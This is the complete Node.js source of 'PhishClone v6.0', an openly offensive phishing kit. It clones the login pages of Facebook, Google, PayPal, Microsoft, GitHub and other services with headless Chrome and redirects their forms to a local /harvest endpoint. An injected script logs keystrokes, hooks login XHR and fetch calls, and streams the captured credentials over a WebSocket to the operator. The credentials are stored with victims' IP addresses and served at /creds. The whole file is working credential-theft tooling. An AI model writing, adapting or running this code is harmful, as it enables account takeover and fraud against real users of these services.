#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v6.0
 * - Intercepts ALL responses in browser → inlines CSS/JS/fonts/images as base64
 * - No external requests from victim browser = perfect styling
 */

import puppeteer   from 'puppeteer'
import http        from 'http'
import https       from 'https'
import net         from 'net'
import fs          from 'fs'
import crypto      from 'crypto'
import readline    from 'readline'
import { createServer } from 'http'
import { createHash }   from 'crypto'

// ── auto-detect Chrome ───────────────────────────────────────────────────────
function findChrome() {
  const candidates = [
    '/usr/bin/chromium','/usr/bin/chromium-browser',
    '/usr/bin/google-chrome','/usr/bin/google-chrome-stable',
  ]
  try {
    const base = '/root/.cache/puppeteer/chrome'
    for (const d of fs.readdirSync(base)) {
      const p = `${base}/${d}/chrome-linux64/chrome`
      if (fs.existsSync(p)) return p
    }
  } catch {}
  for (const c of candidates) if (fs.existsSync(c)) return c
  return null
}
const CHROME = findChrome()
if (!CHROME) { console.error('❌ Chrome not found'); process.exit(1) }

// ── utils ────────────────────────────────────────────────────────────────────
const CREDS_FILE = 'captured_creds.json'
const LOG_FILE   = 'keystrokes.log'

function findFreePort(start) {
  return new Promise(res => {
    const s = net.createServer()
    s.listen(start, () => { const p = s.address().port; s.close(() => res(p)) })
    s.on('error', () => findFreePort(start + 1).then(res))
  })
}

function log(msg) { fs.appendFileSync(LOG_FILE, msg + '\n') }

function saveCred(ip, data, target) {
  let arr = []; try { arr = JSON.parse(fs.readFileSync(CREDS_FILE, 'utf8')) } catch {}
  arr.push({ time: new Date().toISOString(), ip, target, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(arr, null, 2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP=' + ip + ' -> ' + JSON.stringify(data) + ' \x1b[0m\n')
}

function mimeToExt(ct) {
  if (ct.includes('css'))        return 'text/css'
  if (ct.includes('javascript')) return 'application/javascript'
  if (ct.includes('svg'))        return 'image/svg+xml'
  if (ct.includes('png'))        return 'image/png'
  if (ct.includes('jpeg')||ct.includes('jpg')) return 'image/jpeg'
  if (ct.includes('gif'))        return 'image/gif'
  if (ct.includes('webp'))       return 'image/webp'
  if (ct.includes('woff2'))      return 'font/woff2'
  if (ct.includes('woff'))       return 'font/woff'
  if (ct.includes('ttf'))        return 'font/ttf'
  if (ct.includes('json'))       return 'application/json'
  return ct.split(';')[0].trim()
}

// ── menu ─────────────────────────────────────────────────────────────────────
const SITES = [
  { name: 'Facebook',    url: 'https://www.facebook.com/login' },
  { name: 'Instagram',   url: 'https://www.instagram.com/accounts/login/' },
  { name: 'Google',      url: 'https://accounts.google.com/signin' },
  { name: 'Twitter / X', url: 'https://twitter.com/i/flow/login' },
  { name: 'LinkedIn',    url: 'https://www.linkedin.com/login' },
  { name: 'Snapchat',    url: 'https://accounts.snapchat.com/accounts/login' },
  { name: 'TikTok',      url: 'https://www.tiktok.com/login' },
  { name: 'GitHub',      url: 'https://github.com/login' },
  { name: 'Microsoft',   url: 'https://login.microsoftonline.com/' },
  { name: 'PayPal',      url: 'https://www.paypal.com/signin' },
  { name: 'Netflix',     url: 'https://www.netflix.com/login' },
  { name: 'Steam',       url: 'https://store.steampowered.com/login/' },
  { name: 'Discord',     url: 'https://discord.com/login' },
  { name: 'Spotify',     url: 'https://accounts.spotify.com/login' },
  { name: 'Custom URL',  url: null },
]

async function askTarget() {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
  const ask = q => new Promise(r => rl.question(q, r))
  console.clear()
  console.log('\x1b[96m╔══════════════════════════════════════════════════╗')
  console.log('║      phantom-arsenal — PhishClone v6.0          ║')
  console.log('║   Full inline CSS/JS — Perfect clone            ║')
  console.log('╚══════════════════════════════════════════════════╝\x1b[0m\n')
  console.log('\x1b[93m  Select target:\x1b[0m\n')
  SITES.forEach((s, i) => console.log('  \x1b[96m[' + String(i+1).padStart(2,' ') + ']\x1b[0m  ' + s.name))
  console.log('')
  let target = null
  while (!target) {
    const c = await ask('\x1b[92m  Enter number: \x1b[0m')
    const idx = parseInt(c) - 1
    if (idx >= 0 && idx < SITES.length) {
      target = SITES[idx].url === null ? (await ask('\x1b[92m  Enter URL: \x1b[0m')).trim() : SITES[idx].url
    } else console.log('  \x1b[91mInvalid\x1b[0m')
  }
  rl.close()
  return target
}

// ── clone page — intercept all resources ─────────────────────────────────────
async function clonePage(targetUrl, wsPort) {
  console.log('\n[*] Launching Chrome...')
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: CHROME,
    args: ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu']
  })

  const page = await browser.newPage()
  await page.setViewport({ width: 1280, height: 900 })
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36')

  // ── intercept every response and save as base64 data URI ──────────────────
  const resourceMap = new Map()  // url → dataURI or text

  await page.setRequestInterception(true)
  page.on('request', req => req.continue())

  page.on('response', async res => {
    const url  = res.url()
    const ct   = res.headers()['content-type'] || ''
    const mime = mimeToExt(ct)

    // skip main HTML and data URIs
    if (url === targetUrl || url.startsWith('data:') || url.includes('analytics') || url.includes('gtag')) return

    try {
      if (ct.includes('text/css') || ct.includes('javascript') ||
          ct.includes('font') || ct.includes('image') || ct.includes('svg')) {
        const buf  = await res.buffer()
        const b64  = buf.toString('base64')
        const dataUri = `data:${mime};base64,${b64}`
        resourceMap.set(url, dataUri)
      }
    } catch {}
  })

  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 })
  await new Promise(r => setTimeout(r, 2500))

  const finalUrl = page.url()
  let html = await page.content()

  console.log('[+] Rendered: ' + html.length + ' bytes | Resources: ' + resourceMap.size)

  // replace all resource URLs with data URIs
  let replaced = 0
  for (const [origUrl, dataUri] of resourceMap) {
    if (html.includes(origUrl)) {
      html = html.split(origUrl).join(dataUri)
      replaced++
    }
  }
  console.log('[+] Inlined ' + replaced + ' resources as base64')

  await browser.close()

  // ── patch forms ────────────────────────────────────────────────────────────
  html = html.replace(/(<form[^>]*)\s+action="[^"]*"/gi, '$1 action="/harvest"')
  html = html.replace(/(<form[^>]*)\s+action='[^']*'/gi,  "$1 action='/harvest'")
  html = html.replace(/(<form)(?![^>]*action=)([^>]*>)/gi,'$1 action="/harvest"$2')
  html = html.replace(/(<form[^>]*)\s+method="get"/gi,    '$1 method="POST"')

  const redirectUrl = finalUrl.replace(/'/g, "\\'")

  // ── harvester script ───────────────────────────────────────────────────────
  const script = `
<script>
(function(){
  var ws;
  function cws(){ try{ ws=new WebSocket('ws://'+location.hostname+':${wsPort}'); ws.onclose=function(){setTimeout(cws,2000)}; }catch(e){} }
  cws();
  function snd(t,d){ if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()})); }

  // keystrokes
  document.addEventListener('keyup',function(e){
    var t=e.target;
    snd('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value});
  },true);

  // form submit
  document.addEventListener('submit',function(e){
    e.preventDefault();
    var f=e.target, d={};
    new FormData(f).forEach(function(v,k){d[k]=v;});
    snd('submit',d);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
      .then(function(){window.location='${redirectUrl}';});
  },true);

  // click on buttons
  document.addEventListener('click',function(e){
    var el=e.target;
    if(el&&(el.type==='submit'||el.tagName==='BUTTON'||(el.role==='button'))){
      var inp=document.querySelectorAll('input'), d={};
      inp.forEach(function(i){if(i.value)d[i.name||i.id||i.type]=i.value;});
      if(Object.keys(d).length) snd('click_harvest',d);
    }
  },true);

  // patch XHR
  var oX=XMLHttpRequest.prototype.open,oS=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){
    if(b&&this._u&&/login|auth|session|signin/i.test(this._u))
      try{snd('xhr',{url:this._u,body:String(b)});}catch(e){}
    return oS.apply(this,arguments);
  };

  // patch fetch
  var oF=window.fetch;
  window.fetch=function(input,init){
    var u=typeof input==='string'?input:(input&&input.url)||'';
    if(/login|auth|session|signin/i.test(u)){
      var b=(init&&init.body)||'';
      try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}
    }
    return oF.apply(this,arguments);
  };
})();
</script></body>`

  html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, script) : html + script

  return { html, finalUrl }
}

// ── WebSocket server (raw TCP stdlib) ────────────────────────────────────────
function startWS(port) {
  net.createServer(sock => {
    let shook = false, buf = Buffer.alloc(0)
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk])
      if (!shook) {
        const m = buf.toString().match(/Sec-WebSocket-Key: (.+)/)
        if (!m) return
        const acc = createHash('sha1').update(m[1].trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64')
        sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+acc+'\r\n\r\n')
        shook = true; buf = Buffer.alloc(0); return
      }
      if (buf.length < 2) return
      const masked = (buf[1]&0x80)!==0
      let len=buf[1]&0x7F, off=2
      if (len===126){len=buf.readUInt16BE(2);off=4}
      if (buf.length < off+(masked?4:0)+len) return
      let pl
      if (masked){const mk=buf.slice(off,off+4);off+=4;pl=Buffer.from(buf.slice(off,off+len));for(let i=0;i<pl.length;i++)pl[i]^=mk[i%4];}
      else pl=buf.slice(off,off+len)
      buf=buf.slice(off+len)
      try {
        const d=JSON.parse(pl.toString()), t=d.type||''
        if (t==='keystroke'){
          const l='[KEY] field='+(d.data.field||'?')+'  key='+(d.data.key||'?')+'  val='+(d.data.value||'')
          console.log('\x1b[93m'+l+'\x1b[0m'); log(l)
        } else if (['submit','click_harvest','xhr','fetch_login'].includes(t)){
          const l='['+t.toUpperCase()+'] '+JSON.stringify(d.data)
          console.log('\x1b[92m'+l+'\x1b[0m'); log(l)
        }
      } catch {}
    })
    sock.on('error',()=>{})
  }).listen(port)
}

// ── main ─────────────────────────────────────────────────────────────────────
const targetUrl = process.argv[2] || await askTarget()
const PORT    = await findFreePort(parseInt(process.argv[3]||'8080'))
const WS_PORT = await findFreePort(PORT+1)

const { html, finalUrl } = await clonePage(targetUrl, WS_PORT)
startWS(WS_PORT)

createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname

  if (path === '/') {
    const b = Buffer.from(html, 'utf8')
    res.writeHead(200, { 'Content-Type': 'text/html;charset=utf-8', 'Content-Length': b.length })
    res.end(b)

  } else if (path === '/creds') {
    let b = '[]'; try { b = fs.readFileSync(CREDS_FILE,'utf8') } catch {}
    res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(b)

  } else if (path === '/harvest' && req.method === 'POST') {
    let body = ''
    req.on('data', c => body += c)
    req.on('end', () => {
      let data; try { data = JSON.parse(body) } catch { data = Object.fromEntries(new URLSearchParams(body)) }
      saveCred(req.socket.remoteAddress || '?', data, finalUrl)
      res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":true}')
    })
  } else { res.writeHead(404); res.end() }

}).listen(PORT, () => {
  console.log('\n[+] WebSocket  : ws://0.0.0.0:' + WS_PORT)
  console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
  console.log('[+] View Creds : http://0.0.0.0:' + PORT + '/creds')
  console.log('\x1b[93m[*] Ready — waiting for victims...\x1b[0m\n')
})

process.on('SIGINT', () => {
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try {
    const c = JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))
    console.log('[+] Captured: ' + c.length)
    c.forEach(x => console.log('  > '+x.time+' | IP='+x.ip+' | '+JSON.stringify(x.credentials)))
  } catch {}
  process.exit(0)
})
